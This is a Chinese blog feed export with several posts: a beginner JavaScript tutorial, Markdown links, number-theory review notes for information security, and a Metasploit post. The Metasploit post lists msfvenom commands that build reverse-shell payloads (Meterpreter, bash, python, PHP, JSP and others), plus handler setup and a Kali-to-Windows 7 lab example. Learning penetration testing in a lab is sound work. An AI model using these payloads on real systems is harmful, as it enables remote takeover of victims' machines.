<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;来试一波&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c877dd02cfeb.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert(<span class="number">5</span> + <span class="number">6</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c877e7a8a039.png" alt="1.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） document.write(str) 写到 HTML 文档</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>document意思“文档”，就是整个网页了。</li>
<li>document是一个文档对象，代表整个网页。</li>
<li>write()是document对象的一个输出方法。</li>
<li>“.”小数点：通过小数点(.)来调用对象的方法。</li>
<li>str：表示要输出的内容。</li>
</ol>
<p><strong>注意事项：</strong></p>
<ol>
<li>请使用 document.write() 仅仅向文档输出写内容。</li>
<li>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</li>
</ol>
<br />

<p>下面实例说明document.write()在文档加载完后执行将会覆盖之前的页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;点击“点我”前的页面&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;这是“点我”前的页面Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;myFunction()&quot;</span>&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在没有点击“点我”前的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a1aca7f.png" alt="3.png"></p>
<p><br />在点击“点我”后的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a5c3ea4.png" alt="4.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（3） innerHTML 操作 HTML 元素</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>innerHTML用于操作 HTML 元素。</li>
<li>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。</li>
<li>请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</li>
</ol>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;再来试一波&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8780490c44e.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=<span class="string">&quot;demo&quot;</span>&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML=<span class="string">&quot;段落已修改。&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c87808ae6e21.png" alt="2.png"></p>
<p><strong>说明：</strong>以上 JavaScript 语句（在 <code>&lt;script&gt;</code> 标签中）可以在 web 浏览器中执行：</p>
<ol>
<li><strong><code>document.getElementById(&quot;demo&quot;)</code> ：</strong>是使用 <code>id</code> 属性来查找 HTML 元素的 JavaScript 代码 。</li>
<li><strong><code>innerHTML = &quot;段落已修改。&quot;</code>：</strong> 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。</li>
</ol>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（4） console.log() 写到控制台。</strong></font></p>
<p>如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。</p>
<p>浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p>
<p><strong>Tip：</strong>程序中调试是测试，查找及减少bug(错误)的过程。</p>
<br />

<p>下面实例代码先写到一个 .html的文档里，然后在浏览器运行这个文档。运行后启用调试模式点击”Console” 菜单即可看到输出结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;输出到控制台&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8787ce408d7.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;注意要启动调试模式&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">浏览器中(Chrome, IE, Firefox) 使用 F12 来启用调试模式， 在调试窗口中点击 <span class="string">&quot;Console&quot;</span> 菜单。</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">a = <span class="number">5</span>;</span><br><span class="line">b = <span class="number">6</span>;</span><br><span class="line">c = a + b;</span><br><span class="line">console.log(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c8788a01fd0b.png" alt="5.png"></p>
<br />

<br />

<h3 id="二-JavaScript-语法"><a href="#二-JavaScript-语法" class="headerlink" title="二. JavaScript 语法"></a><font color="#FF6347" face="Comic sans MS">二. JavaScript 语法</font></h3><br />

<h4 id="2-1-基本法则"><a href="#2-1-基本法则" class="headerlink" title="2.1 基本法则"></a><font color="#3CB371" face="Comic sans MS">2.1 基本法则</font></h4><blockquote>
<ol>
<li><strong>声明变量：</strong>使用关键字**<code>var</code>**，如：<code>var name; var num=12;</code></li>
<li><strong>命名规则：</strong>变量名不能以数字开头，可以是字母或下划线开头。变量名可以包含字母、数字、下划线。</li>
<li><strong>大小写敏感：</strong>JS中的变量名是区分大小写的。</li>
<li><strong>驼峰式命名：</strong>第一个单词全小写，后面的每一个单词首字母大写。如：**<code>var  getUserName;</code>**</li>
<li><strong>语句块：</strong>花括号**<code>&#123;...&#125;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>语句结束符：</strong>英文分号**<code>;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>缩进：</strong>花括号{…}内的语句具有缩进，通常是4个空格，并不强制使用。缩进有助于我们理解代码的层次。</li>
<li><strong>注释：</strong>单行**<code>//</code><strong>，多行</strong><code>/*...*/</code>**，不是所有的 JavaScript 语句都是”命令”。</li>
<li><strong>空格：</strong>JavaScript 会忽略多余的空格。可以向脚本添加空格，来提高其可读性。</li>
<li><strong>一行：</strong>一行代码可包含多个语句，每个语句用**<code>;</code>**表示语句结束。但 不建议一行写多个语句!（因为要层次感）</li>
<li><strong>多行：</strong>文本字符串中使用反斜杠**<code>\</code>**对代码行进行换行。但是只能字符串使用，变量名函数名等其他不能使用。</li>
</ol>
</blockquote>
<p>如：<br><code>document.write(&quot;你好 \</code><br><code>世界!&quot;);</code></p>
<p><strong>提示：</strong>JavaScript 是脚本语言。浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</p>
<br />

<p><font color="#FF7F00"><strong>Tip1：</strong></font>以下是 JavaScript 中最​​重要的保留字（按字母顺序）：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87933bee96c.png" alt="6.png"></p>
<br />

<p><font color="#FF7F00"><strong>Tip2：</strong></font>JavaScript 有多种数据类型：数字，字符串，数组，对象等等（在编程语言中，一般固定值称为字面量，如 3.14。）：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> length = <span class="number">16</span>;                                  <span class="comment">// Number 通过数字字面量赋值 </span></span><br><span class="line"><span class="keyword">var</span> points = x * <span class="number">10</span>;                              <span class="comment">// Number 通过表达式字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&quot;Johnson&quot;</span>;                         <span class="comment">// String 通过字符串字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> cars = [<span class="string">&quot;Saab&quot;</span>, <span class="string">&quot;Volvo&quot;</span>, <span class="string">&quot;BMW&quot;</span>];              <span class="comment">// Array  通过数组字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>&#125;;  <span class="comment">// Object 通过对象字面量赋值</span></span><br></pre></td></tr></table></figure>

<br />

<p><font color="#FF7F00"><strong>Tip3：</strong></font>JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。</p>
<p>下表列出了 JavaScript 语句标识符 (关键字) ：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87953d930f2.png" alt="7.png"></p>
<p><font color="#FF7F00"></font></p>
<br />

<h4 id="2-2-变量和数据类型"><a href="#2-2-变量和数据类型" class="headerlink" title="2.2 变量和数据类型"></a><font color="#3CB371" face="Comic sans MS">2.2 变量和数据类型</font></h4><br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） 变量</strong></font></p>
<p>变量是有数据类型的，这个类型来源于“变量的值”，换句话说：值是什么类型的，变量就是什么类型的。</p>
<p>这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下：</p>
<p>int a &#x3D; 123; &#x2F;&#x2F; a是整数类型变量，类型用int申明a &#x3D; “ABC”; &#x2F;&#x2F; 错误：不能把字符串赋给整型变量</p>
<p>和静态语言相比，动态语言更灵活，就是这个原因。</p>
<blockquote>
<p><font color="#FF7F00"><strong>变量命名规则：</strong></font></p>
</blockquote>
<ol>
<li>变量必须以字母开头</li>
<li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ol>
<br />

<p>您可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>, age=<span class="number">30</span>, job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>声明也可横跨多行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">age=<span class="number">30</span>,</span><br><span class="line">job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>但是一条语句中声明的多个不可以赋同一个值（x,y 为 undefined， z 为 14。）：）:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x,y,z=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） 数据类型</strong></font></p>
<p><font color="#FF7F00"><strong>JS中八种数据类型：</strong></font>Number（数值型）、String（字符串）、bool（布尔型）、undefined、null、array、object、function</p>
<p>这八种数据类型，又分为两大类：</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown</title>
    <url>/post/MarkdownUsage/</url>
    <content><![CDATA[<p><a href="http://marxi.co/">1.Markdown在线编辑器</a></p>
<p><a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown">2.Markdown高级语法大全</a></p>
<p><a href="https://www.zybuluo.com/mdeditor">3.Markdown高级语法</a></p>
<hr>
<hr>
]]></content>
  </entry>
  <entry>
    <title>信息安全数学基础复习笔记</title>
    <url>/post/Mathematical-basis/</url>
    <content><![CDATA[<p>&amp;nbsp;<font face="楷体">12.3复习笔记</font></p>
<h4 id="第一章、整数的可除性"><a href="#第一章、整数的可除性" class="headerlink" title="第一章、整数的可除性"></a><font face="楷体">第一章、整数的可除性</font></h4><h5 id="1-1-整数的概念、欧几里得除法"><a href="#1-1-整数的概念、欧几里得除法" class="headerlink" title="1.1 整数的概念、欧几里得除法"></a><font face="楷体">1.1 整数的概念、欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg" alt="2"></a><br>&amp;nbsp;</p>
<h5 id="1-2-最大公因数与广义欧几里得除法"><a href="#1-2-最大公因数与广义欧几里得除法" class="headerlink" title="1.2 最大公因数与广义欧几里得除法"></a><font face="楷体">1.2 最大公因数与广义欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg" alt="3"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg" alt="4"></a><br>&amp;nbsp;</p>
<h5 id="1-3-整除的进一步性质及最小公倍数"><a href="#1-3-整除的进一步性质及最小公倍数" class="headerlink" title="1.3 整除的进一步性质及最小公倍数"></a><font face="楷体">1.3 整除的进一步性质及最小公倍数</font></h5><h5 id="1-4-整数分解"><a href="#1-4-整数分解" class="headerlink" title="1.4 整数分解"></a><font face="楷体">1.4 整数分解</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg" alt="5"></a><br>&amp;nbsp;</p>
<h5 id="1-5-素数的算术基本定理"><a href="#1-5-素数的算术基本定理" class="headerlink" title="1.5 素数的算术基本定理"></a><font face="楷体">1.5 素数的算术基本定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg" alt="6"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第二章、同余"><a href="#第二章、同余" class="headerlink" title="第二章、同余"></a><font face="楷体">第二章、同余</font></h4><h5 id="2-1-同余的概念及基本性质"><a href="#2-1-同余的概念及基本性质" class="headerlink" title="2.1 同余的概念及基本性质"></a><font face="楷体">2.1 同余的概念及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg" alt="7"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg" alt="8"></a><br>&amp;nbsp;</p>
<h5 id="2-2-剩余类及完全剩余系"><a href="#2-2-剩余类及完全剩余系" class="headerlink" title="2.2 剩余类及完全剩余系"></a><font face="楷体">2.2 剩余类及完全剩余系</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg" alt="9"></a><br>&amp;nbsp;</p>
<h5 id="2-3-简化剩余系与欧拉函数"><a href="#2-3-简化剩余系与欧拉函数" class="headerlink" title="2.3 简化剩余系与欧拉函数"></a><font face="楷体">2.3 简化剩余系与欧拉函数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg" alt="10"></a><br>&amp;nbsp;</p>
<h5 id="2-4-欧拉定理、费马小定理、Wilson定理"><a href="#2-4-欧拉定理、费马小定理、Wilson定理" class="headerlink" title="2.4 欧拉定理、费马小定理、Wilson定理"></a><font face="楷体">2.4 欧拉定理、费马小定理、Wilson定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg" alt="11"></a><br>&amp;nbsp;</p>
<h5 id="2-5-模重复平方算法"><a href="#2-5-模重复平方算法" class="headerlink" title="2.5 模重复平方算法"></a><font face="楷体">2.5 模重复平方算法</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg" alt="12"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">12.5复习笔记</font></p>
<h4 id="第三章、同余式"><a href="#第三章、同余式" class="headerlink" title="第三章、同余式"></a><font face="楷体">第三章、同余式</font></h4><h5 id="3-1-基本概念及一次同余式"><a href="#3-1-基本概念及一次同余式" class="headerlink" title="3.1 基本概念及一次同余式"></a><font face="楷体">3.1 基本概念及一次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg" alt="13"></a><br>&amp;nbsp;</p>
<h5 id="3-2-中国剩余定理"><a href="#3-2-中国剩余定理" class="headerlink" title="3.2 中国剩余定理"></a><font face="楷体">3.2 中国剩余定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg" alt="14"></a><br>&amp;nbsp;</p>
<h5 id="3-3-高次同余式的解法及解数"><a href="#3-3-高次同余式的解法及解数" class="headerlink" title="3.3 高次同余式的解法及解数"></a><font face="楷体">3.3 高次同余式的解法及解数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg" alt="15"></a><br>&amp;nbsp;</p>
<h5 id="3-4-素数模的同余式"><a href="#3-4-素数模的同余式" class="headerlink" title="3.4 素数模的同余式"></a><font face="楷体">3.4 素数模的同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg" alt="16"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第四章、二次同余式与平方剩余"><a href="#第四章、二次同余式与平方剩余" class="headerlink" title="第四章、二次同余式与平方剩余"></a><font face="楷体">第四章、二次同余式与平方剩余</font></h4><h5 id="4-1-一般二次同余式"><a href="#4-1-一般二次同余式" class="headerlink" title="4.1 一般二次同余式"></a><font face="楷体">4.1 一般二次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg" alt="17"></a><br>&amp;nbsp;</p>
<h5 id="4-2-模为奇素数的平方剩余与平方剩余"><a href="#4-2-模为奇素数的平方剩余与平方剩余" class="headerlink" title="4.2 模为奇素数的平方剩余与平方剩余"></a><font face="楷体">4.2 模为奇素数的平方剩余与平方剩余</font></h5><h5 id="4-3-勒让得符号"><a href="#4-3-勒让得符号" class="headerlink" title="4.3 勒让得符号"></a><font face="楷体">4.3 勒让得符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg" alt="18"></a><br>&amp;nbsp;</p>
<h5 id="4-4-二次互反律"><a href="#4-4-二次互反律" class="headerlink" title="4.4 二次互反律"></a><font face="楷体">4.4 二次互反律</font></h5><h5 id="4-5-雅可比符号"><a href="#4-5-雅可比符号" class="headerlink" title="4.5 雅可比符号"></a><font face="楷体">4.5 雅可比符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg" alt="19"></a></p>
<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="第五章、原根与指标"><a href="#第五章、原根与指标" class="headerlink" title="第五章、原根与指标"></a><font face="楷体">第五章、原根与指标</font></h4><h5 id="5-1-指数及基本性质"><a href="#5-1-指数及基本性质" class="headerlink" title="5.1 指数及基本性质"></a><font face="楷体">5.1 指数及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg" alt="20"></a><br><a href="https://s1.ax1x.com/2018/12/09/F8apHs.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8apHs.jpg" alt="21"></a><br>&amp;nbsp;</p>
<h5 id="5-2-原根"><a href="#5-2-原根" class="headerlink" title="5.2 原根"></a><font face="楷体">5.2 原根</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8anb9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8anb9.jpg" alt="22"></a><br>&amp;nbsp;</p>
<h5 id="5-3-指标及n次同余式"><a href="#5-3-指标及n次同余式" class="headerlink" title="5.3 指标及n次同余式"></a><font face="楷体">5.3 指标及n次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8a38K.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8a38K.jpg" alt="23"></a><br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>信安数学</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom生成各类Payload命令，远程木马攻击</title>
    <url>/post/Metasploit1/</url>
    <content><![CDATA[<h4 id="msfvenom生成各类Payload命令"><a href="#msfvenom生成各类Payload命令" class="headerlink" title="   msfvenom生成各类Payload命令"></a><font face="Arial">   msfvenom生成各类Payload命令</font></h4><blockquote>
<p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit&#x2F;multi&#x2F;handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p>
</blockquote>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><font face="Arial">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf</font></p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><font face="Arial">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe</font></p>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p><font face="Arial">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f macho &gt; shell.macho</font></p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p><font face="Arial">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.php</font></p>
<p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p>
<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><p><font face="Arial">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f asp &gt; shell.asp</font></p>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p><font face="Arial">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.jsp</font></p>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><p><font face="Arial">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f war &gt; shell.war                    Scripting Payloads</font></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.py</font></p>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.sh</font></p>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><p><font face="Arial">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.pl</font></p>
<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><p><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p>
<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><p><font face="Arial">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f <language></font></p>
<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT&#x3D;<Your Port to Connect On> -f  language    “language放在&lt;&gt;里”<br></font></p>
<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><p><font face="Arial">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f <language></font></p>
<h5 id="Handlers模块"><a href="#Handlers模块" class="headerlink" title="Handlers模块"></a><font face="Arial">Handlers模块</h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</font></p>
<blockquote>
<p><font face="Arial">use exploit&#x2F;multi&#x2F;handler</font><br> <font face="Arial">set LHOST <LHOST value></font><br> <font face="Arial">set LPORT <LPORT value></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘</font></p>
</blockquote>
<hr>
<p>&amp;nbsp;<br>&amp;nbsp;<br><strong>下面以一个实例说明使用方法</strong></p>
<p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html">Metasploit渗透测试笔记(Meterpreter篇</a></p>
<p>远程控制软件–&gt;远控后门木马程序</p>
<p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p>
<p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p>
<p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm">参考文献一</a><br><a href="http://www.i0day.com/1173.html">类似文献二</a></p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;你的ip LPORT&#x3D;你的端口 -f exe -o payload.exe</p>
